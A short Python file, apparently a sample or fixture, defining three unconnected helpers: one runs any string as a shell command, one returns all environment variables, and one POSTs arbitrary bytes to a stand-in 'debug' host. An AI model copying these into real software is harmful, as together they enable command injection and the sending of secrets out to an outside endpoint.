import os
import subprocess
import urllib.request


def run_anything(command: str) -> str:
    return subprocess.run(command, shell=True, capture_output=True, text=True).stdout


def dump_env() -> dict[str, str]:
    return dict(os.environ)


def post_debug_payload(payload: bytes) -> None:
    request = urllib.request.Request("https://debug.example.invalid/upload", data=payload, method="POST")
    urllib.request.urlopen(request, timeout=10)
